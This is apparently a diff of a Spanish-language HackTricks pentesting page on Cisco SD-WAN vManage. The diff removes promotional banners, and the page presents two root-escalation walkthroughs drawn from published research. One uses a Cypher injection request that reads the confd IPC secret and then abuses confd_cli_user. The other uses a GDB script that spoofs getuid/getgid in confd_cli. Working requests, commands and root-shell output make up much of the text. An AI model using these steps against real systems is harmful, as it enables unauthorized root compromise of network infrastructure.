@@ -1,31 +1,19 @@
 # Cisco - vmanage
 
-{% hint style="success" %}
-Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
-Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
-
-<details>
-
-<summary>Support HackTricks</summary>
-
-* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
-* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
-* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
-
-</details>
-{% endhint %}
-
 ## Path 1
 
 (Example from [https://www.synacktiv.com/en/publications/pentesting-cisco-sd-wan-part-1-attacking-vmanage.html](https://www.synacktiv.com/en/publications/pentesting-cisco-sd-wan-part-1-attacking-vmanage.html))
 
 Después de investigar un poco en alguna [documentación](http://66.218.245.39/doc/html/rn03re18.html) relacionada con `confd` y los diferentes binarios (accesibles con una cuenta en el sitio web de Cisco), encontramos que para autenticar el socket IPC, utiliza un secreto ubicado en `/etc/confd/confd_ipc_secret`:
+
 ```
 vmanage:~$ ls -al /etc/confd/confd_ipc_secret
 
 -rw-r----- 1 vmanage vmanage 42 Mar 12 15:47 /etc/confd/confd_ipc_secret
 ```
+
 Recuerda nuestra instancia de Neo4j? Se está ejecutando con los privilegios del usuario `vmanage`, lo que nos permite recuperar el archivo utilizando la vulnerabilidad anterior:
+
 ```
 GET /dataservice/group/devices?groupId=test\\\'<>\"test\\\\\")+RETURN+n+UNION+LOAD+CSV+FROM+\"file:///etc/confd/confd_ipc_secret\"+AS+n+RETURN+n+//+' HTTP/1.1
 
@@ -37,7 +25,9 @@ Host: vmanage-XXXXXX.viptela.net
 
 "data":[{"n":["3708798204-3215954596-439621029-1529380576"]}]}
 ```
+
 El programa `confd_cli` no soporta argumentos de línea de comandos, pero llama a `/usr/bin/confd_cli_user` con argumentos. Así que podríamos llamar directamente a `/usr/bin/confd_cli_user` con nuestro propio conjunto de argumentos. Sin embargo, no es legible con nuestros privilegios actuales, así que tenemos que recuperarlo del rootfs y copiarlo usando scp, leer la ayuda y usarlo para obtener el shell:
+
 ```
 vManage:~$ echo -n "3708798204-3215954596-439621029-1529380576" > /tmp/ipc_secret
 
@@ -55,6 +45,7 @@ vManage:~# id
 
 uid=0(root) gid=0(root) groups=0(root)
 ```
+
 ## Path 2
 
 (Example from [https://medium.com/walmartglobaltech/hacking-cisco-sd-wan-vmanage-19-2-2-from-csrf-to-remote-code-execution-5f73e2913e77](https://medium.com/walmartglobaltech/hacking-cisco-sd-wan-vmanage-19-2-2-from-csrf-to-remote-code-execution-5f73e2913e77))
@@ -62,6 +53,7 @@ uid=0(root) gid=0(root) groups=0(root)
 El blog¹ del equipo synacktiv describió una forma elegante de obtener un shell root, pero la advertencia es que requiere obtener una copia de `/usr/bin/confd_cli_user`, que solo es legible por root. Encontré otra forma de escalar a root sin tales complicaciones.
 
 Cuando desensamblé el binario `/usr/bin/confd_cli`, observé lo siguiente:
+
 ```
 vmanage:~$ objdump -d /usr/bin/confd_cli
 … snipped …
@@ -90,13 +82,16 @@ vmanage:~$ objdump -d /usr/bin/confd_cli
 4016c4:   e8 d7 f7 ff ff           callq  400ea0 <*ABS*+0x32e9880f0b@plt>
 … snipped …
 ```
+
 Cuando ejecuto “ps aux”, observé lo siguiente (_note -g 100 -u 107_)
+
 ```
 vmanage:~$ ps aux
 … snipped …
 root     28644  0.0  0.0   8364   652 ?        Ss   18:06   0:00 /usr/lib/confd/lib/core/confd/priv/cmdptywrapper -I 127.0.0.1 -p 4565 -i 1015 -H /home/neteng -N neteng -m 2232 -t xterm-256color -U 1358 -w 190 -h 43 -c /home/neteng -g 100 -u 1007 bash
 … snipped …
 ```
+
 I hypothesized the “confd\_cli” program passes the user ID and group ID it collected from the logged in user to the “cmdptywrapper” application.
 
 Mi primer intento fue ejecutar “cmdptywrapper” directamente y suministrarle `-g 0 -u 0`, pero falló. Parece que se creó un descriptor de archivo (-i 1015) en algún lugar del camino y no puedo falsificarlo.
@@ -106,6 +101,7 @@ Como se mencionó en el blog de synacktiv (último ejemplo), el programa `confd_
 Creé un script de GDB donde forcé a la API `getuid` y `getgid` a devolver 0. Dado que ya tengo privilegios de “vmanage” a través de la deserialización RCE, tengo permiso para leer directamente el archivo `/etc/confd/confd_ipc_secret`.
 
 root.gdb:
+
 ```
 set environment USER=root
 define root
@@ -123,7 +119,9 @@ root
 end
 run
 ```
+
 Salida de la consola:
+
 ```
 vmanage:/tmp$ gdb -x root.gdb /usr/bin/confd_cli
 GNU gdb (GDB) 8.0.1
@@ -157,17 +155,3 @@ root
 uid=0(root) gid=0(root) groups=0(root)
 bash-4.4#
 ```
-{% hint style="success" %}
-Aprende y practica Hacking en AWS:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
-Aprende y practica Hacking en GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
-
-<details>
-
-<summary>Apoya a HackTricks</summary>
-
-* Revisa los [**planes de suscripción**](https://github.com/sponsors/carlospolop)!
-* **Únete al** 💬 [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **síguenos** en **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
-* **Comparte trucos de hacking enviando PRs a los** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repositorios de github.
-
-</details>
-{% endhint %}
